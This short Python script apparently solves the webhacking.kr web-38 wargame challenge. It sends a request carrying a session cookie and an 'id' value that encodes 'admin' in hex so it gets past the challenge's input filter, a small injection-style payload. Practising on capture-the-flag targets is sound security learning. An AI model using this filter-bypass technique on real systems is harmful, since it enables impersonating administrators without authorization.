import requests

url = 'https://webhacking.kr/challenge/web-38/'
cookie = {'PHPSESSID':'0909bmvv8nldvgqau8k3c3h3ph'}
query = '0x61646d696e id'
res = requests.get(url + "/?id=" + query, cookies = cookie)
print(res.text)
